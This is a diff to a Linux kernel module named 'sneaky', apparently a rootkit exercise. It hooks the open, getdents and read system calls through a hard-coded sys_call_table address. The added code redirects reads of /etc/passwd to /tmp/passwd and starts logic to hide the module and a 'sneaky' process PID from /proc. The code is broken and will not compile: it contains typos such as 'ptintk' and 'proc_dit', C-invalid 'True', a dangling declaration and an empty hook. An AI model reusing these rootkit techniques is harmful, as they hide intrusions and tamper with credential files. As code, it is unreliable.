@@ -36,7 +36,8 @@ void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;
 // Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 // We're getting its adddress from the System.map file (see above).
 static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;
-
+// static bool hide_spid_flag = False;
+static bool hide_module_flag = False;
 static char *spid = "";
 module_param(spid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);)
 MODULE_PARM_DESC(spid, "Sneaky Process Pid");
@@ -51,8 +52,6 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
                                     unsigned int count);
 
 asmlinkage int (*original_read)(int fd, void *buf, size_t count);
-
-asmlinkage int (*original_close)(int fd);
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count) {
@@ -84,9 +83,43 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,
 }
 
 // Define our new sneaky version of the 'open' syscall
+// Need to consider /proc and /proc/modules
+// If hide_spid_flag ==True, close it and change it to False.
+// If hide_module_flag ==True,close it and change it to False.
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
-  printk(KERN_INFO "Very, very Sneaky!\n");
-  return original_call(pathname, flags);
+  int result;
+  int status;
+  char *original_path = "/etc/passwd";
+  char *temp_path = "/tmp/passwd";
+  // char *proc_dir = "/proc";
+  char *proc_modules = "/proc/modules";
+  if (!strcmp(original_path, pathname)) {
+    printk(KERN_INFO "Starting to open tmp/passwd\n");
+    status = copy_to_user((void *)original_path, temp_path, sizeof(temp_path));
+    if (status) {
+      printk(KERN_INFO "Fail to call copy_to_user\n");
+    }
+    result = original_call(pathname, flags);
+  } else {
+    /* if (!strcmp(pathname, proc_dir)) { */
+    /*   printk(KERN_INFO "Starting to hide Sneaky PID.\n"); */
+    /*   hide_spid_flag = True; */
+    /* } */
+    if (!strcmp(pathname, proc_dit)) {
+      ptintk(KERN_INFO "Starting to hide Sneaky Module.\n");
+      hide_module_flag = True;
+    }
+  }
+  return result;
+}
+
+asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
+  ssize_t byte_read;
+  byte_read = original_read(fd, buf, count);
+  if (hide_module_flag) {
+  }
+  char *
+  // if()
 }
 
 // The code that gets executed when the module is loaded
@@ -137,7 +170,7 @@ static void exit_sneaky_module(void) {
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_read) = (unsigned long)original_read;
-  *(sys_call_table + __NR_close) = (unsigned long)original_close;
+
   // Revert page to read-only
   pages_ro(page_ptr, 1);
   // Turn write protection mode back on
